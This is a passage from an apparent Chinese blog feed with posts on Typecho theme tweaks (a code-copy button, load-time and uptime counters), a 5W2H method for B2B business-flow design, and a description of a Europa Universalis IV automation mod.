class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>之后添加时光轴记录的时候只需要一条一条添加就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;&lt;b&gt;xxxx年xx月&lt;/b&gt;内容&lt;/li&gt;</span><br></pre></td></tr></table></figure><p>因为是CSS实现的理论上都能适用</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> typecho </tag>
            
            <tag> 时间轴 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5W2H，帮助你梳理B端产品业务流程</title>
      <link href="/163.html"/>
      <url>/163.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/yun/202212171442872.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>在产品设计的过程中，不可避免的会涉及到产品的业务流程的设计，业务流程往往是多用户、多角色、甚至是多企业协作最终完成最终目标。</p><p>例如：</p><p>To C电商产品设计过程中：主业务流程是：商家发布商品 → 用户选择商品 → 用户购买商品 → 商家处理订单 → 物流配送运单 → 用户接收货品。在这个主线业务流程中由商家、用户、支付公司、快递公司三方协作完成最终用户在线上购买到商品的最终目标。</p><p>To B交易类产品设计过程中同样存在相关的业务流程：买家发布信息 → 卖家对接信息 → 双方签署合同 → 买家支付货款 → 卖家履约交付。因此在这里个人凭借经验总结了个人的业务流程设计方法分享给大家做参考，主要面向刚步入这个领域的产品经理，老司机请自动忽略。</p><p>整个设计过程主要分为以下五个阶段：</p><ol><li>梳理业务流程：主要运用5W2H的方法获取到现实场景中的实际情况，即使没有现实场景可以参考，也要进行梳理，不能忽略。</li><li>切分阶段目标：在主要业务流程中切分各个角色任务在业务流程中的主要业务阶段目标及子业务目标。并可以此作为切分页面的主要依据。</li><li>细抠目标要素：仔细获取不同的用户完成不同的子目标所需要获取关键要素，并对要素进行分类、分级。</li><li>用户页面设计：基于以上分析设计用户页面，不包括网站整体架构设计。仅包括页面流程、页面布局、交互设计、文案设计等。</li><li>目标用户测试：将设计好的页面带入原场景中进行测试，有能力的邀请目标用户并运用辅助工具帮助获取测试结果，加以调整。</li></ol><p>这里我重点描述前面三点梳理的过程，细节设计的第四点和测试验证的第五点不在此累述。</p><h2 id="一、梳理业务流程"><a href="#一、梳理业务流程" class="headerlink" title="一、梳理业务流程"></a>一、梳理业务流程</h2><p>梳理业务流程是一个挺复杂的过程，这个过程主要是以实际的业务场景为基础获取业务信息，然后抽象出一个以参与对象为节点的业务流程。此流程应当包括5W2H内容：Who、What、Why、Where、When、How to、How much，最终可以通过泳道图等工具一目了然的展现方式展现出来。</p><h3 id="1-Who：用户，整个业务流程中所有涉及到的相关方"><a href="#1-Who：用户，整个业务流程中所有涉及到的相关方" class="headerlink" title="1. Who：用户，整个业务流程中所有涉及到的相关方"></a>1. Who：用户，整个业务流程中所有涉及到的相关方</h3><p>需要提醒的有如下几点：</p><ul><li>不单有客户、商家、可能还会涉及到平台侧的服务人员，如：店小二、撮合员等。</li><li>针对B类产品客户、商家可能不仅仅是单一角色，可能还会涉及到多个角色，如：业务员、内勤人员、财务人员，在不同阶段参与人和参与度都不同。</li><li>可能会涉及到产品定位以外的人员，比如行政管理人员等。早期可不做深入挖掘，但也需要收集，了解其参与的作用。</li></ul><h3 id="2-What：目标，即用户需要完成哪些事儿"><a href="#2-What：目标，即用户需要完成哪些事儿" class="headerlink" title="2. What：目标，即用户需要完成哪些事儿"></a>2. What：目标，即用户需要完成哪些事儿</h3><p>这可作为后期拆分页面的依据。</p><ul><li>针对2C电商类产品，比如：发布商品、选择商品、购买商品、处理订单、配送货品、接收货品等。</li><li>针对2B类产品，比如：发布需求、对接需求、签署合同、支付货款、履约交付等。</li></ul><p>当然，这些都是用户在业务进行到一定的阶段需要完成的一些相对大一点的阶段性的目标。这些目标在后续需要进行进一步的细分处理拆解子目标，作为后期切分页面的依据。</p><h3 id="3-Why：原因，了解用户为什么需要完成目标"><a href="#3-Why：原因，了解用户为什么需要完成目标" class="headerlink" title="3. Why：原因，了解用户为什么需要完成目标"></a>3. Why：原因，了解用户为什么需要完成目标</h3><p>这涉及到设计的流程及页面是否可以进行优化和调整，是否可以从流程上进行节点删除。梳理业务流程不是简单的照搬，需要分析现有实际场景中各节点的必要性，现有流程是否可以进行优化或者调整，知道原因能够有效的帮你判断。</p><p>例如：订单生成后的调整价格，其源头在于用户与商家间的议价行为。如果是一口价流程中，则可以省去此节点。而且，为什么比是什么更重要，仅关注是什么的问题，这是舍本就末。</p><h3 id="4-Where：地点，主要说明用户会在什么地点完成目标"><a href="#4-Where：地点，主要说明用户会在什么地点完成目标" class="headerlink" title="4. Where：地点，主要说明用户会在什么地点完成目标"></a>4. Where：地点，主要说明用户会在什么地点完成目标</h3><p>地点影响到，你提供给用户完成目标的入口，如：订单处理人员的办公地点多在办公室内，工作环境多数对着PC端，如果仅提供移动端页面就是不符合场景的。仓库管理人员往往需要盘货，仓库内很可能不能携带手机，也不会坐在PC前，因此其往往提供的是专业的智能终端，如：POS机、码枪等。</p><h3 id="5-When：时间，主要说明用户会在什么时间完成目标"><a href="#5-When：时间，主要说明用户会在什么时间完成目标" class="headerlink" title="5. When：时间，主要说明用户会在什么时间完成目标"></a>5. When：时间，主要说明用户会在什么时间完成目标</h3><p>时间影响到你提供给用户完成目标的交互设计内容等，如：工作时间，用户完成目标可能由于本职工作，需要信息尽可能的详细，甚至对于信息的真实性来源等都有所考虑。但如果是业余时间，则用户可能没有意愿完成细致工作，简单的移交或者搁置、审批等则是更好的选择。另外在视觉设计环节，夜晚使用的页面设计和白天使用的页面设计是不同的，例如微博的夜间模式。</p><h3 id="6-How-to：如何完成目标"><a href="#6-How-to：如何完成目标" class="headerlink" title="6. How to：如何完成目标"></a>6. How to：如何完成目标</h3><p>这个过程真正体现了当前场景下用户是如何操作、处理的。值得一提的是，这个环节需要特别在意用户习惯，需要深刻挖掘用户习惯。在后续的设计中最好是要能够契合用户习惯或者能够细微调整它，若无政策要求（行业、企业强制命令），最好不要做大的改变。</p><p>例如：很多企业门店的营业员操作工作用电脑的时候，切换信息输入框是通过Tab键来操作的，并且一直的习惯是自上而下，从左往右。但是新设计页面在右边有很大的鼠标操作按钮，并且进入页面就焦点设置为此处，这样就会改变他们的操作习惯，让用户觉得不适应。同样，财务人员输入数字通常使用小键盘，如果为了防止出错，交互设计改为鼠标点击数字，也会让用户觉得非常的不适应。</p><h3 id="7-How-much：完成其目标所需要花费的成本代价"><a href="#7-How-much：完成其目标所需要花费的成本代价" class="headerlink" title="7. How much：完成其目标所需要花费的成本代价"></a>7. How much：完成其目标所需要花费的成本代价</h3><p>这点是可以打动用户的一个很重要的方面。如果可以把收费升级为免费，把货真价实变成物超所值，或者在等价值的基础上给用户更多的体验，这将是产品的杀手锏。</p><p>以上是梳理业务流程需要提搞清楚的相关内容，获取这些信息的方法可以通过：现场调研、用户访谈、场景观察等方法获悉。获悉后，将相关内容分类梳理归集成以上几点内容，可以通过【场景列表】+【泳道图】表现出来。（以下案例内容纯属虚构，请勿当真）</p><p>场景列表：<br><img src="https://cos.gjcloak.xyz/yun/202212171447053.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>泳道图：<br><img src="https://cos.gjcloak.xyz/yun/202212171447050.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>需要提醒一点：传统业务需求梳理通常会画一张业务流程图，业务流程图的重点展现业务流程，缺点是往往缺少用户。如下图（摘自百度）：<br><img src="https://cos.gjcloak.xyz/yun/202212171447205.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>因此，结合【泳道图】+【业务流程图】更清晰明了。</p><h2 id="二、切分子目标"><a href="#二、切分子目标" class="headerlink" title="二、切分子目标"></a>二、切分子目标</h2><p>在业务梳理的过程中，我们会获取到用户在不同阶段的业务目标，这些都是以推进业务完成为目的阶段性业务目标，但是在用户实际完成这些目标的时候还可以拆分成为更小维度的子目标。如：用户的目标是找到合适的商品，在这个过程中可以拆分成为查找商品分类，浏览商品列表，浏览单个商品多个子目标。</p><p>另外切分子目标的好处在于：</p><ol><li>可以依据阶段性目标和子目标拆分页面，可以初步判断单一页面完成一个子目标为宜。</li><li>拆分大小目标可以辅助后续第三步骤细抠页面排版及目标要素。</li><li>拆分大小目标可以为用户测试准备。</li></ol><p>切分页面可以遵循以下几个规律给大家参考：</p><ol><li>同一业务流程中，不同的用户完成的阶段性目标，一定拆分成为不同的页面。</li><li>同一业务流程中，同一用户完成的一个阶段性目标，需要拆分成为单一的页面。 例如用户选择商品和用户购买商品这两个都是阶段性目标，拆分成两个页面。</li><li>同一业务流程中，同一阶段性目标的不同子目标，可以拆分成不同的页面，也可以合并成一个页面。例如：订单处理人员处理订单，如果首先需要了解有多少订单需要处理，则就需要单独页面；然后处理单挑订单可以单独订单处理页面。但是场景如果切换成为客服人员处理订单问题，则可以通过在一个页面中录入订单号直接查询订单，就不需要拆分页面。</li></ol><h2 id="三、细抠目标要素"><a href="#三、细抠目标要素" class="headerlink" title="三、细抠目标要素"></a>三、细抠目标要素</h2><p>当场景通过阶段目标及子目标切分后，就进入页面设计阶段：</p><p>首先，基于用户使用场景，梳理完成页面指定目标（可以阶段目标也可以是子目标）实现的页面流程，标记操作点。例如，订单管理人员稽核审核订单信息是否正确，流程图如下：<br><img src="https://cos.gjcloak.xyz/yun/202212171450200.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>因此完成这个目标需要拆解成为如下几个操作点：查询未稽核订单、查询单个订单、填写备注、转客服处理、转仓库发货。</p><p><strong>其次，基于页面流程对信息进行过滤。</strong>信息过滤原则如下：</p><ul><li>保留必须信息：保留在页面操作过程中必须的信息，如：订单时间、订单编号、订单类型等。</li><li>隐藏可要可不要的信息：部分信息在特殊场景下影响用户判断，需要展现，常规场景下不需要展现，就要进行隐藏，用户按需点开展现。如：订单是出问题的历史订单，这里只需要标记，如果有需要疑问可以点开查询历史更新记录。</li><li>删除不必要的信息：不必要的信息对于当前用户决策不起作用，堆砌在页面上可能会影响用户处理效率，直接删除。但是要提醒的是，不必要的信</li></ul><p>信息是相对的，例如买家信息，在筛选未处理稽核订单时，是无效信息，直接删除不用展现；在单订单稽核处理操作时，其就是重要信息，应重点展现。</p><p><strong>最后，对于保留展现的信息内容进行分类</strong>，按照信息的相关性进行分类，方法可以使用卡片法。</p><h2 id="四、用户页面设计（本文不累述）"><a href="#四、用户页面设计（本文不累述）" class="headerlink" title="四、用户页面设计（本文不累述）"></a>四、用户页面设计（本文不累述）</h2><p>基于以上分析设计用户页面，不包括网站整体架构设计。仅包括页面流程、页面布局、交互设计、文案设计等。</p><h2 id="五、目标用户测试（本文不累述）"><a href="#五、目标用户测试（本文不累述）" class="headerlink" title="五、目标用户测试（本文不累述）"></a>五、目标用户测试（本文不累述）</h2><p>目标用户测试是原型设计完毕之后，有效修正设计的重要手段。面对ToB类的产品，最好一定邀请实际的使用用户基于设计的原型进行用户测试。目标</p><p>用户测试有以下几个好处：</p><ul><li>避免浪费：利用原型进行用户测试可以能够在较早期发现设计的缺陷进行优化，避免浪费视觉及研发资源。</li><li>专家评审：ToB类产品用户，相对于其需要完成工作，多数都是专家级用户，获取专家评审意见有助于产品更切近用户习惯。</li><li>构建预期：ToB类产品用户测试可以给目标用户构建用户的预期，便于后期推广使用。</li><li>拟定培训手段：ToB类产品用户测试时可以在早期提供给设计团队用户反馈情况，便于后期制定用户使用培训手段，以及提前构建问题库。</li></ul><p>综合以上五步，主要是业务流程梳理、设计、验证的过程，不涉及到产品功能体系结构的搭建及后续设计研发内容，纯属个人方法总结，提供给大家做做参考，欢迎交流。</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 业务流程 </tag>
            
            <tag> 中级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【欧陆风云4】Avanced Automation/高级自动化</title>
      <link href="/b3b3d88e.html"/>
      <url>/b3b3d88e.html</url>
      
        <content type="html"><![CDATA[<p>特点：<br>-高度可自定义，功能可以随时开启关闭，功能的执行逻辑可以进行自定义<br>-安静，没有事件弹窗，所有操作在决议里</p><p>功能列表：<br>1.自动化殖民<br>2.自动化传教<br>3.自动分配贸易公司省份（可自定义逻辑）<br>4.自动化剥削省份税收<br>5.快速拆除建筑（可自定义）<br>6.快速建造（可自定义）<br>7.自动没收阶层领土</p><p>功能介绍：<br>1.自动化殖民-自动开展殖民工作，但仍然受到国家殖民范围以及开图的限制，超出范围或者未发现的省份无法进行殖民<br>（注意：受到原版代码限制，无法直接派遣殖民者，也就是说由殖民者带来的额外定居概率是无法生效的，代码的解决方式是检测定居的概率，然后每月自动添加对应人口，有可能会和原版产生一定差异）<br>（同样，这个mod并不会占用殖民者，但是无法在任何别的省份进行殖民）</p><p>2.自动化传教-自动检测国家的传教强度，对能够传教的省份进行传教，同时撤回无法传教省份的传教士（添加了针对异端和异教传教强度差别的检测，现在异端和异教省份判定的传教强度是不同的，能够确保不出bug）</p><p>3.自动化分配贸易公司省份-可以自动将自治省份添加进贸易公司，并且可以自定义逻辑<br>-可以选择是否绕过宗教检测，现在默认情况下非正统信仰的省份不会被加入贸易公司，开启该选项可以无视宗教<br>-可以选择自动将具有高贸易竞争力的省份加入贸易公司（例如贸易中心和河口）<br>-可以是否判定金矿省份，含有金矿的省份不会被加入贸易公司（该选项默认开启！！）<br>-可以选择特定的贸易品，将含有该贸易品的省份加入贸易公司<br>-也可以将上面的逻辑反过来，若省份含有特定贸易品，则这个省份不会被加入贸易公司<br>-含有原版所有贸易品（除了煤炭，正常人类应该不会吧煤炭加入贸易公司？？？？）</p><p>4.自动化剥削省份税收-会每隔一段时间自动剥削每个省份的税收<br>-默认情况下，如果剥削税收会导致省份的建筑格减少，例如该省份是10，20等这种整数发展度，那么这个省份不会被剥削，但是有选项可以无视掉这个风险</p><p>5. 快速拆除建筑-可以对某些类型的建筑物进行标记，然后一键移除</p><p>6. 快速建造-一键建造某种建筑，一键投资贸易公司，一键清除不合适的工厂<br>-如果一个省份是酒类，或者是鱼类，也就是更适合建造士兵之家的省份，却建造了别的不合适的工厂，那么可以一键拆除这些不合适的工厂腾出空间</p><p>7. 自动没收阶层土地-每隔一段时间自动没收阶层的土地<br>-默认情况下，必须要所有阶层忠诚度达到50%才会进行剥削，但是也有选项可以无视这一条</p><p>8. 自动转化省份文化-会每隔一段时间自动转化省份的文化，默认情况下只会转化非同文化组，非已接受文化的省份<br>-可以选择是否转化已接受文化省份，以及同文化组省份<br>-默认情况下会保留至少300点外交点数用于他途，可以选择关闭这道保险</p><p>更新计划：<br>1. 改进自动化殖民的额外定居逻辑，更符合原版<br>2. 改进自动化殖民对殖民者的占用逻辑<br>3.自动分配贸易公司的逻辑优化，增加对特定需求的适应<br>5.添加mod专用金币池的机制，可以手动或自动将金币转入金币池，mod操作时使用的金币将会从这里扣除，防止自动把钱花光</p><p>对一些功能的想法：<br>1. 自动化建造建筑：本来是想做的，但是想了想，感觉会很容易把钱全都乱花光，然后耽搁别的事情，所以还是改成了手动建造，防止乱花钱，但是如果有想要这个功能的我也可以加上<br>2. 为什么只添加了工厂，市政厅，士兵之家这些建筑的一键建造：工厂，士兵之家这些是可以限定范围的，而且无论怎么样基本都得要建，市政厅&#x2F;大学这些，不会占用格子，所以最后也基本是要建的，但是其他的，在什么省份，什么时候建造，最终到底要不要建还是得看玩家自己，目前这个功能的逻辑还在制作（优先建造收益最高的省份），但是优先级不高。<br>3.自动化分配贸易公司：本人开贸易公司是一直洗完宗教后根据贸易品开公司的，一般只开低价贸易品，贸易中心以及河口的省份，所以操作量需求很大，考虑到不同玩家对低价贸易品的定义可能不一样，这里做了可自定义的分配逻辑，可以自己选择分配对应的贸易品</p><p>这个是本人第一次写eu4的mod，以及本人的游戏时长只有400小时左右，可能有些地方理解有问题，如果有bug，或者对某些功能有建议和想法请务必提出！！<br>更新记录：<br>12&#x2F;7&#x2F;2022:<br>1.修改了事件触发方式，旧的触发方式会不定时的导致存档崩溃或者读档后损坏<br>1&#x2F;10&#x2F;2023:<br>1.修复了分配贸易公司功能中存在的bug<br>2.添加了自动文化转化的功能，添加了可自定义的转化逻辑</p><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>Advanced Automation【高级自动化】</p><p><a href="https://pan.baidu.com/s/1_40gtbUCmHTjRwJPSN0sZg">下载</a></p><p>提取码</p><p>2333</p><p>正版创意工坊订阅地址</p><p><a href="https://steamcommunity.com/sharedfiles/filedetails/?id=2898287623">下载</a></p><p>文件大小</p><p>0.584 MB</p><p>发表于</p><p>2022 年 12 月 6 日 下午 10:08</p><p>更新日期</p><p>4 月 24 日 下午 6:08</p><h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-9.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-10.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-11.png"></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> mod </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typecho给代码块添加复制功能</title>
      <link href="/160.html"/>
      <url>/160.html</url>
      
        <content type="html"><![CDATA[<p>在主题目录下建立一个js文件放置到js目录</p><p>添加以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">var codeblocks = document.getElementsByTagName(&quot;pre&quot;)</span><br><span class="line">//循环每个pre代码块，并添加 复制代码</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; codeblocks.length; i++) &#123;</span><br><span class="line">//显示 复制代码 按钮</span><br><span class="line">currentCode = codeblocks[i]</span><br><span class="line">currentCode.style = &quot;position: relative;&quot;</span><br><span class="line">var copy = document.createElement(&quot;div&quot;)</span><br><span class="line">copy.style = &quot;position: absolute;right: 4px;\</span><br><span class="line">top: 4px;background-color: white;padding: 2px 8px;\</span><br><span class="line">margin: 8px;border-radius: 4px;cursor: pointer;\</span><br><span class="line">z-index: 9999;\</span><br><span class="line">box-shadow: 0 2px 4px rgba(0,0,0,0.05), 0 2px 4px rgba(0,0,0,0.05);&quot;</span><br><span class="line">copy.innerHTML = &quot;复制&quot;</span><br><span class="line">currentCode.appendChild(copy)</span><br><span class="line">//让所有 &quot;复制&quot;按钮 全部隐藏</span><br><span class="line">copy.style.visibility = &quot;hidden&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; codeblocks.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">!function (i) &#123;</span><br><span class="line">    //鼠标移到代码块，就显示按钮</span><br><span class="line">    codeblocks[i].onmouseover = function () &#123;</span><br><span class="line">        codeblocks[i].childNodes[1].style.visibility = &quot;visible&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //执行 复制代码 功能</span><br><span class="line">    function copyArticle(event) &#123;</span><br><span class="line">        const range = document.createRange();</span><br><span class="line"></span><br><span class="line">        //范围是 code，不包括刚才创建的div</span><br><span class="line">        range.selectNode(codeblocks[i].childNodes[0]);</span><br><span class="line"></span><br><span class="line">        const selection = window.getSelection();</span><br><span class="line">        if (selection.rangeCount &gt; 0) selection.removeAllRanges();</span><br><span class="line">        selection.addRange(range);</span><br><span class="line">        document.execCommand(&#x27;copy&#x27;);</span><br><span class="line"></span><br><span class="line">        codeblocks[i].childNodes[1].innerHTML = &quot;复制成功&quot;</span><br><span class="line">        setTimeout(function () &#123;</span><br><span class="line">            codeblocks[i].childNodes[1].innerHTML = &quot;复制&quot;</span><br><span class="line">        &#125;, 1000);</span><br><span class="line">        //清除选择区</span><br><span class="line">        if (selection.rangeCount &gt; 0) selection.removeAllRanges(); 0</span><br><span class="line">    &#125;</span><br><span class="line">    codeblocks[i].childNodes[1].addEventListener(&#x27;click&#x27;, copyArticle, false);</span><br><span class="line"></span><br><span class="line">&#125;(i);</span><br><span class="line"></span><br><span class="line">!function (i) &#123;</span><br><span class="line">    //鼠标从代码块移开 则不显示复制代码按钮</span><br><span class="line">    codeblocks[i].onmouseout = function () &#123;</span><br><span class="line">        codeblocks[i].childNodes[1].style.visibility = &quot;hidden&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>footer.php</code>页面添加以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;&lt;?php $this-&gt;options-&gt;themeUrl(&#x27;js/codecopy.js&#x27;); ?&gt;&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typecho </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typecho底部添加加载时间</title>
      <link href="/159.html"/>
      <url>/159.html</url>
      
        <content type="html"><![CDATA[<p>首先，将以下代码放入主题文件<code>function.php</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/*     </span><br><span class="line"> * 加载时间</span><br><span class="line"> * @return bool</span><br><span class="line"> */</span><br><span class="line">function timer_start() &#123;</span><br><span class="line">    global $timestart;</span><br><span class="line">    $mtime     = explode( &#x27; &#x27;, microtime() );</span><br><span class="line">    $timestart = $mtime[1] + $mtime[0];</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line">timer_start();</span><br><span class="line">function timer_stop( $display = 0, $precision = 3 ) &#123;</span><br><span class="line">    global $timestart, $timeend;</span><br><span class="line">    $mtime     = explode( &#x27; &#x27;, microtime() );</span><br><span class="line">    $timeend   = $mtime[1] + $mtime[0];</span><br><span class="line">    $timetotal = number_format( $timeend - $timestart, $precision );</span><br><span class="line">    $r         = $timetotal &lt; 1 ? $timetotal * 1000 . &quot; ms&quot; : $timetotal . &quot; s&quot;;</span><br><span class="line">    if ( $display ) &#123;</span><br><span class="line">        echo $r;</span><br><span class="line">    &#125;</span><br><span class="line">    return $r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，在下面两个中任选其一放入<code>footer.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">加载用时：&lt;?php echo timer_stop();?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--加载时间--&gt;</span><br><span class="line">&lt;li class=&quot;mate-time&quot;&gt;&lt;i class=&quot;fontello fontello-spinner&quot;&gt;&lt;/i&gt;&amp;nbsp;&lt;span class=&quot;mate-value&quot;&gt;&lt;a&gt;加载用时&lt;/a&gt;&lt;?php echo timer_stop();?&gt;&lt;/span&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typecho </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typecho底部添加网站已运行时间</title>
      <link href="/158.html"/>
      <url>/158.html</url>
      
        <content type="html"><![CDATA[<p>要实现这个效果，总共有两个方法</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>在适当的地方加入一下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">本站已安全运行了:</span><br><span class="line">&lt;span class=&quot;smalltxt&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var BirthDay=new Date(&quot;octo 08,2015&quot;);//修改成你网站创建时间today=new Date();</span><br><span class="line">var today=new Date();</span><br><span class="line">var timeold=(today.getTime()-BirthDay.getTime());</span><br><span class="line">var sectimeold=timeold/1000;</span><br><span class="line">var secondsold=Math.floor(sectimeold);</span><br><span class="line">var msPerDay=24*60*60*1000;</span><br><span class="line">var e_daysold=timeold/msPerDay;</span><br><span class="line">var daysold=Math.floor(e_daysold);</span><br><span class="line">document.write(&quot;&quot;+daysold+&quot;天&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/span&gt;</span><br></pre></td></tr></table></figure><p>添加完成后，会显示本站已安全运行了:XX天其中，octo 08,2015为建站日期，格式是月日年，根据自己建站目期修改即可</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>修改<code>functions.php</code>文件，添加以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// 设置时区</span><br><span class="line">date_default_timezone_set(&#x27;Asia/Shanghai&#x27;);</span><br><span class="line">/**</span><br><span class="line">* 秒转时间，格式 年 月 日 时 分 秒</span><br><span class="line">*</span><br><span class="line">* @author Roogle</span><br><span class="line">* @return html</span><br><span class="line">*/</span><br><span class="line">function getBuildTime()&#123;</span><br><span class="line">// 在下面按格式输入本站创建的时间</span><br><span class="line">$site_create_time = strtotime(&#x27;2010-09-10 00:00:00&#x27;);</span><br><span class="line">$time = time() - $site_create_time;</span><br><span class="line">if(is_numeric($time))&#123;</span><br><span class="line">$value = array(</span><br><span class="line">&quot;years&quot; =&gt; 0, &quot;days&quot; =&gt; 0, &quot;hours&quot; =&gt; 0,</span><br><span class="line">&quot;minutes&quot; =&gt; 0, &quot;seconds&quot; =&gt; 0,</span><br><span class="line">);</span><br><span class="line">if($time &gt;= 31556926)&#123;</span><br><span class="line">$value[&quot;years&quot;] = floor($time/31556926);</span><br><span class="line">$time = ($time%31556926);</span><br><span class="line">&#125;</span><br><span class="line">if($time &gt;= 86400)&#123;</span><br><span class="line">$value[&quot;days&quot;] = floor($time/86400);</span><br><span class="line">$time = ($time%86400);</span><br><span class="line">&#125;</span><br><span class="line">if($time &gt;= 3600)&#123;</span><br><span class="line">$value[&quot;hours&quot;] = floor($time/3600);</span><br><span class="line">$time = ($time%3600);</span><br><span class="line">&#125;</span><br><span class="line">if($time &gt;= 60)&#123;</span><br><span class="line">$value[&quot;minutes&quot;] = floor($time/60);</span><br><span class="line">$time = ($time%60);</span><br><span class="line">&#125;</span><br><span class="line">$value[&quot;seconds&quot;] = floor($time);</span><br><span class="line"> echo &#x27;&lt;span 